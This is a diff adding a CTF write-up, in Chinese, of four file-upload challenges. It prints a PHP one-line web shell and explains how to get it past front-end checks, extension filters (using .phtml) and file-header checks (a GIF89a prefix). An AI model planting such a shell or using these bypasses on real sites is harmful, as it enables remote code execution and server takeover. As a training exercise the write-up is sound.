@@ -79,6 +79,88 @@ data伪协议
 
 
 # 文件上传
+## EZFU
+![image.png](https://img.xobear.cn/file/CTF/WEB/Qingcen/1785027704804_image.png)
+没有过滤，上传一个1.php 一句话木马`<?php eval($_POST[1]);?>`
+![image.png](https://img.xobear.cn/file/CTF/WEB/Qingcen/1785027691055_image.png)
+接下来就是一般操作
+
+在目录中没找到flag，在phpinfo中发现了
+
+
+## EZFU_1
+![image.png](https://img.xobear.cn/file/CTF/WEB/Qingcen/1785027952567_image.png)
+只让传照片了
+
+![image.png](https://img.xobear.cn/file/CTF/WEB/Qingcen/1785028107605_image.png)
+前端验证，随便上传照片，抓包，直接修改后缀和内容。试了一下后端没有验证
+![image.png](https://img.xobear.cn/file/CTF/WEB/Qingcen/1785028344376_image.png)
+
+然后直接访问即可
+![image.png](https://img.xobear.cn/file/CTF/WEB/Qingcen/1785028582720_image.png)
+flag还是在phpinfo()中
+
+## EZFU_2
+![image.png](https://img.xobear.cn/file/CTF/WEB/Qingcen/1785028691764_image.png)
+这次前端验证没了，上传一句话木马，显示文件类型不允许，后端加了校验。
+![image.png](https://img.xobear.cn/file/CTF/WEB/Qingcen/1785028968660_image.png)
+用1.txt试了一下，对文件内容也有验证，经过多次尝试对内容php 和= 有过滤
+
+----
+可以使用`.phtml`作为后缀
+
+`.phtml` 本质**就是 PHP 文件**，和 `.php` 功能完全一致，只是后缀不同。
+
+----
+直接就上传了，内容也没有检验
+![image.png](https://img.xobear.cn/file/CTF/WEB/Qingcen/1785030122194_image.png)
+
+![image.png](https://img.xobear.cn/file/CTF/WEB/Qingcen/1785030112059_image.png)
+
+
+## EZFU_3
+![image.png](https://img.xobear.cn/file/CTF/WEB/Qingcen/1785030539079_image.png)
+
+不可以直接传脚本文件，抓包传
+
+![image.png](https://img.xobear.cn/file/CTF/WEB/Qingcen/1785030745290_image.png)
+检验文件头了  
+给文件内容加上文件头才能绕过，最简单的就是加 GIF 头，把上传文件内容改为：
+ ``GIF89a <?php eval($_POST[1]);?>``
+![image.png](https://img.xobear.cn/file/CTF/WEB/Qingcen/1785031024647_image.png)	
+
+![image.png](https://img.xobear.cn/file/CTF/WEB/Qingcen/1785030991845_image.png)
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
